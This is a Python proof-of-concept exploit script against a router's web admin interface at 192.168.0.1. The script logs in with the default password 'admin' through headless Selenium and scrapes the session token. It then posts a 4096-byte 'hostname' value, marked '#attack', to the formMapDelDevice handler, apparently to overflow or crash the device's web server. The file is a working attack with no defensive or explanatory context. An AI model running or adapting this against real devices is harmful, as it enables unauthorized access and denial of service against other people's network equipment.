import logging
import requests
import time
from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.chrome.options import Options
from webdriver_manager.chrome import ChromeDriverManager


sessionId = ""

def getSessionId():
    global sessionId


    options = Options()
    options.add_argument("--headless=new") 
    options.add_argument("--disable-dev-shm-usage")
    options.add_argument("--disable-gpu")
    options.add_argument("--window-size=1920x1080")  
    driver = webdriver.Chrome(service=Service(ChromeDriverManager().install()), options=options)
    login_url = "http://192.168.0.1/login.htm"
    
    driver.get(login_url)

    password_input = driver.find_element(By.NAME, 'password')
    password_input.send_keys("admin")
    password_input.send_keys(Keys.RETURN)
    time.sleep(2)
    driver.get('http://192.168.0.1/urlfilter.htm')
    sessionCheck_element = driver.find_element(By.NAME, "sessionCheck")
    sessionId = sessionCheck_element.get_attribute("value")
   

    driver.quit()
    print(f'session:{sessionId}')

def attack():
    global sessionId
    print(sessionId)
    url = 'http://192.168.0.1/boafrm/formMapDelDevice'
    headers = {
        'Host': '192.168.0.1',
        'Cache-Control': 'max-age=0',
        'Accept-Language': 'en-US,en;q=0.9',
        'Origin': 'http://192.168.0.1',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Upgrade-Insecure-Requests': '1',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Referer': 'http://192.168.0.1/multi_ap_popup_client_details.htm',
        'Accept-Encoding': 'gzip, deflate, br',
        'Connection': 'keep-alive'
    }

    data = {
        "sessionCheck": sessionId,
        "submit-url": "",
        "macstr": "",
        "bandstr": "",
        "hostname": "a"*0x1000, #attack
        "hostnameAdd": "Apply"
    }
    response = requests.post(url, headers=headers, data=data)

def main():
    getSessionId()
    attack()
if __name__ == '__main__':
    main()
